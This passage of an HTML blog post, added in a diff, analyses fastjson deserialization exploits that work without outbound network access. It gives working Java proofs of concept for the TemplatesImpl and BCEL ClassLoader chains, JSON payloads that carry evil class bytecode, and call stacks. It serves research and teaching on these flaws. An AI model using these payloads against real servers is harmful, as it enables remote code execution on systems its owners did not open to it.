@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="TemplatesImpl 链影响范围fastjson &lt;&#x3D; 1.2.24 缺点： 代码要开 Feature，因为CC3的后半段的字段都是public的，默认不支持，所以挺鸡肋的。 漏洞分析漏洞本质：source 为 TemplatesImpl#getOutputProperties，通过 fastjson 触发；sink 就是正常的CC3后半段链子，实现动态类加载，并且可以把恶意">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化 不出网利用">
+<meta property="og:url" content="https://jaspersec.top/posts/3821091475.html">
+<meta property="og:site_name" content="Jasper_sec">
+<meta property="og:description" content="TemplatesImpl 链影响范围fastjson &lt;&#x3D; 1.2.24 缺点： 代码要开 Feature，因为CC3的后半段的字段都是public的，默认不支持，所以挺鸡肋的。 漏洞分析漏洞本质：source 为 TemplatesImpl#getOutputProperties，通过 fastjson 触发；sink 就是正常的CC3后半段链子，实现动态类加载，并且可以把恶意">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c42e36f083d06cb469e2bb1824e8548d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/9f3bffd838a5bee5c5af218e8822cc69.png">
+<meta property="article:published_time" content="2025-03-15T04:32:20.000Z">
+<meta property="article:modified_time" content="2025-03-31T22:09:47.239Z">
+<meta property="article:author" content="Jasper_sec">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="Fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c42e36f083d06cb469e2bb1824e8548d.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>fastjson反序列化 不出网利用</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Jasper_sec" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span> 
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/3957940821.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/1342605474.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/posts/3821091475.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/posts/3821091475.html&text=fastjson反序列化 不出网利用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/posts/3821091475.html&is_video=false&description=fastjson反序列化 不出网利用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson反序列化 不出网利用&body=Check out this article: https://jaspersec.top/posts/3821091475.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/posts/3821091475.html&title=fastjson反序列化 不出网利用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/posts/3821091475.html&name=fastjson反序列化 不出网利用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/posts/3821091475.html&t=fastjson反序列化 不出网利用"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <!-- 
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl-%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">TemplatesImpl 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BCEL-%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">BCEL 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-number">2.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c3p0%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">c3p0二次反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-number">3.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-1"><span class="toc-number">3.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-io-%E5%86%99%E2%BD%82%E4%BB%B6-webshell-TODO"><span class="toc-number">4.</span> <span class="toc-text">Commons-io 写⽂件&#x2F;webshell TODO</span></a></li></ol>
+      </div>
+     -->
+    <div id="toc">
+      <div id="toc-div" class="toc-article" >
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl-%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">TemplatesImpl 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BCEL-%E9%93%BE"><span class="toc-number">2.</span> <span class="toc-text">BCEL 链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-number">2.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">2.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c3p0%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">c3p0二次反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-number">3.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-1"><span class="toc-number">3.3.</span> <span class="toc-text">参考链接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Commons-io-%E5%86%99%E2%BD%82%E4%BB%B6-webshell-TODO"><span class="toc-number">4.</span> <span class="toc-text">Commons-io 写⽂件&#x2F;webshell TODO</span></a></li></ol>
+        
+      </div>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        fastjson反序列化 不出网利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Jasper_sec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-15T04:32:20.000Z" class="dt-published" itemprop="datePublished">2025-03-15</time>
+        
+        (Updated: <time datetime="2025-03-31T22:09:47.239Z" class="dt-updated" itemprop="dateModified">2025-04-01</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Fastjson/" rel="tag">Fastjson</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="TemplatesImpl-链"><a href="#TemplatesImpl-链" class="headerlink" title="TemplatesImpl 链"></a>TemplatesImpl 链</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>fastjson &lt;&#x3D; 1.2.24</p>
+<p>缺点： 代码要开 Feature，因为CC3的后半段的字段都是public的，默认不支持，所以挺鸡肋的。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞本质：source 为 <code>TemplatesImpl#getOutputProperties</code>，通过 fastjson 触发；sink 就是正常的CC3后半段链子，实现动态类加载，并且可以把恶意类写入 _bytecodes，从而实现不出网利用。</p>
+<p>构造Exp的代码如下：</p>
+<figure class="highlight java"><figcaption><span>title:"Poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.templatesImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: poc for fastjson 1.2.24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-04-01 03:46</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> ClassFile2Base64(<span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Calc.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;%s\&quot;,\&quot;_bytecodes\&quot;: [\&quot;%s\&quot;],&#x27;_name&#x27;:&#x27;jasper&#x27;,&#x27;_tfactory&#x27;:&#123;&#125;,&#x27;_outputProperties&#x27;:&#123;&#125;&#125;&quot;</span>, className,codes);</span><br><span class="line">        JSON.parse(exp, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">ClassFile2Base64</span><span class="params">(String filePath)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数调用栈</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bytesValue:112, JSONScanner</span><br><span class="line">deserialze:136, ObjectArrayCodec</span><br><span class="line">parseArray:723, DefaultJSONParser</span><br><span class="line">deserialze:177, ObjectArrayCodec</span><br><span class="line">parseField:71, DefaultFieldDeserializer</span><br><span class="line">parseField:773, JavaBeanDeserializer</span><br><span class="line">deserialze:600, JavaBeanDeserializer</span><br><span class="line">deserialze:188, JavaBeanDeserializer</span><br><span class="line">deserialze:184, JavaBeanDeserializer</span><br><span class="line">parseObject:368, DefaultJSONParser</span><br><span class="line">parse:1327, DefaultJSONParser</span><br><span class="line">parse:1293, DefaultJSONParser</span><br><span class="line">parse:137, JSON</span><br><span class="line">parse:193, JSON</span><br><span class="line">main:13, Test1TemplatesImpl</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="BCEL-链"><a href="#BCEL-链" class="headerlink" title="BCEL 链"></a>BCEL 链</h2><p>本质：实际就是 bcel 的 classloader 支持携带字节码进行类加载，所以用这个类可以不用访问外网实现类加载。</p>
+<h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
+<li>fastjson &lt;&#x3D; 1.2.47 or fastjson &lt;&#x3D; 1.2.24</li>
+<li>jdk &lt; 8u251</li>
+</ul>
+<p>漏洞所需依赖有下面两种，实际上只要有tomcat就可以了，因为tomcat自带tomcat-dbcp依赖：</p>
+<p>tomcat 依赖，注意 payload 变化：&lt;&#x3D;tomcat7 source点是 <code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>、&gt;&#x3D;tomcat8 source点 是 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.0.53<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>commons-dbcp 依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>注意：poc 也分两种， <strong>fastjson 的不同版本，对应的 payload 构造和 source 点也不同</strong>。</p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>bcel exp for fastjson &lt;&#x3D; 1.2.24</p>
+<figure class="highlight java"><figcaption><span>title:"poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: bcel for fastjson &lt;= 1.2.24</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-03-15 14:56</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_24</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// jdk &lt; 8u251</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> file2bcelcode(evilClass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +<span class="comment">/*此处Tomcat7 org.apache.tomcat.dbcp.dbcp.BasicDataSource、Tomcat8及以后 org.apache.tomcat.dbcp.dbcp2.BasicDataSource*/</span></span><br><span class="line">                        <span class="string">&quot;    \&quot;driverClassLoader\&quot;: &#123;\&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    \&quot;driverClassName\&quot;: \&quot;$$BCEL$$&quot;</span>+ code +<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">file2bcelcode</span><span class="params">(String classFilePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">        <span class="keyword">return</span> Utility.encode(bytecode, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>一个经典的 fastjson 调用 getter，source 点是 <code>BasicDataSource#getConnection</code> ，同时设置 ClassLoader为bcel，sink 点是 <code>BasicDataSource#createConnectionFactory</code>。</p>
+<p><strong>bcel 可以不出网进行动态类加载的原因</strong>：在 <code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code> 中，如果 <code>class_name</code> 以 <code>$$BCEL$$</code> 开头，则会读取 <code>class_name</code> 后面的字节码并调用 <code>define_class</code> 进行类的加载。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c42e36f083d06cb469e2bb1824e8548d.png"></p>
+<p><strong>所以攻击者可以把字节码写进 payload 里，从而实现不出网的动态类加载。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">defineClass:642, ClassLoader (java.lang)</span><br><span class="line">loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:348, Class (java.lang)</span><br><span class="line">createConnectionFactory:2156, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">createDataSource:2061, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">getConnection:1543, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">get:451, FieldInfo (com.alibaba.fastjson.util)</span><br><span class="line">getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSON:902, JSON (com.alibaba.fastjson)</span><br><span class="line">toJSON:824, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:206, JSON (com.alibaba.fastjson)</span><br><span class="line">main:27, POC_1_2_24 